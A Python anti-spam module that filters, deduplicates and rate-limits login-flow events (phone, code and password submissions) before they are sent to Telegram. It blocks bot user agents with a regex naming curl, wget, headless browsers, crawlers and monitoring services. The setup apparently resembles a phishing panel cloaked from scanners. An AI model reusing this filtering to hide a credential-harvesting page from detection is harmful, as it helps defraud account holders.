from __future__ import annotations

import re
import time
from collections import defaultdict, deque
from typing import Deque, Dict, Optional, Tuple


# шумные UI-события (дублируют серверные auth.* или спамят)
NOISE_ACTIONS = frozenset(
	{
		"ui.ready",
		"auth.start",
		"auth.phone.result",
		"auth.code.result",
		"auth.password.result",
		"auth.ui.step",
		"auth.ui.phone_click",
		"auth.ui.code_click",
		"auth.ui.password_click",
		"auth.ui.result",
		"auth.ui.reload",
		"auth.ui.ready",
		"client.context",
	}
)

# важные — не режем по noise, только rate/bot
IMPORTANT_ACTIONS = frozenset(
	{
		"visit",
		"click.login",
		"auth.phone.submit",
		"auth.phone.error",
		"auth.code.submit",
		"auth.code.error",
		"auth.password.submit",
		"auth.password.error",
		"auth.done",
		"auth.ui.error",
		"logout",
		"click.logout",
	}
)

_BOT_UA = re.compile(
	r"("
	r"bot|crawl|spider|slurp|scrapy|curl|wget|python-requests|httpclient|"
	r"go-http-client|java/|okhttp|libwww|phantomjs|headless|selenium|"
	r"puppeteer|playwright|ahrefs|semrush|petalbot|bytespider|gptbot|"
	r"claudebot|chatgpt|openai|yandexbot|googlebot|bingbot|baiduspider|"
	r"facebookexternalhit|twitterbot|discordbot|telegrambot|preview|"
	r"monitor|uptime|pingdom|statuscake|datadog|newrelic"
	r")",
	re.I,
)

# дедуп: action -> ttl сек
_DEDUP_TTL = {
	"visit": 90,
	"click.media": 8,
	"click.login": 4,
	"click.copy_link": 15,
	"auth.ui.close": 5,
	"auth.ui.edit_phone": 5,
	"default": 3,
}


class AntiSpam:
	def __init__(
		self,
		*,
		per_ip_limit: int = 25,
		per_ip_window: int = 300,
		global_limit: int = 40,
		global_window: int = 60,
	) -> None:
		self.per_ip_limit = per_ip_limit
		self.per_ip_window = per_ip_window
		self.global_limit = global_limit
		self.global_window = global_window
		self._ip_hits: Dict[str, Deque[float]] = defaultdict(deque)
		self._global_hits: Deque[float] = deque()
		self._dedup: Dict[str, float] = {}
		self._muted_until: Dict[str, float] = {}
		self._mute_notified: Dict[str, float] = {}

	def allow(
		self,
		action: str,
		*,
		ip: str,
		ua: str,
	) -> Tuple[bool, Optional[str]]:
		"""
		Returns (allow_send_to_telegram, optional_notice_to_send_instead).
		"""
		now = time.time()
		self._cleanup(now)

		if self._is_bot(ua):
			return False, None

		if action in NOISE_ACTIONS and action not in IMPORTANT_ACTIONS:
			return False, None

		# IP уже в mute
		muted_until = self._muted_until.get(ip, 0)
		if muted_until > now:
			# один раз сообщить о mute
			if self._mute_notified.get(ip, 0) + 60 < now:
				self._mute_notified[ip] = now
				return True, (
					f"🛡 Антиспам: IP {ip} временно заглушен "
					f"(слишком много логов). До {_fmt_ts(muted_until)}"
				)
			return False, None

		# дедуп одинаковых событий
		ttl = _DEDUP_TTL.get(action, _DEDUP_TTL["default"])
		dedup_key = f"{ip}|{action}"
		last = self._dedup.get(dedup_key, 0)
		if now - last < ttl:
			return False, None
		self._dedup[dedup_key] = now

		# rate limit
		if not self._under_limits(ip, now):
			self._muted_until[ip] = now + self.per_ip_window
			self._mute_notified[ip] = now
			return True, (
				f"🛡 Антиспам: IP {ip} превысил лимит логов "
				f"({self.per_ip_limit}/{self.per_ip_window}с). Пауза."
			)

		self._register_hit(ip, now)
		return True, None

	def _under_limits(self, ip: str, now: float) -> bool:
		ip_q = self._ip_hits[ip]
		while ip_q and now - ip_q[0] > self.per_ip_window:
			ip_q.popleft()
		while self._global_hits and now - self._global_hits[0] > self.global_window:
			self._global_hits.popleft()
		if len(ip_q) >= self.per_ip_limit:
			return False
		if len(self._global_hits) >= self.global_limit:
			return False
		return True

	def _register_hit(self, ip: str, now: float) -> None:
		self._ip_hits[ip].append(now)
		self._global_hits.append(now)

	def _cleanup(self, now: float) -> None:
		# чистим старый dedup
		expired = [k for k, ts in self._dedup.items() if now - ts > 600]
		for key in expired:
			self._dedup.pop(key, None)
		expired_mute = [k for k, ts in self._muted_until.items() if ts <= now]
		for key in expired_mute:
			self._muted_until.pop(key, None)
			self._mute_notified.pop(key, None)

	@staticmethod
	def _is_bot(ua: str) -> bool:
		text = (ua or "").strip()
		if not text or text == "-":
			return True
		if len(text) < 20:
			return True
		return bool(_BOT_UA.search(text))


def _fmt_ts(ts: float) -> str:
	return time.strftime("%H:%M:%S", time.localtime(ts))


anti_spam = AntiSpam()
